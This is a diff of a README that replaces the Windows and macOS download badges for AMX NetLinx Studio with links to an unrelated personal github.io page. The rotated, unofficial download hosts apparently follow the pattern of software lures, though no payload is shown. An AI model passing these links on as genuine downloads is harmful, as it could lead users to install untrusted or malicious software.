@@ -10,8 +10,8 @@
 
 <div align="center">  
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://amx-netlinx-studio-desktop-app.github.io/.github)  
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-silver?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/amx-netlinx-studio)  
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://reebabard3154.github.io/.github/amx-netlinx-studio-app)  
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-silver?style=for-the-badge&logo=apple)](https://reebabard3154.github.io/.github/amx-netlinx-studio-app)  
 
 </div>  
 
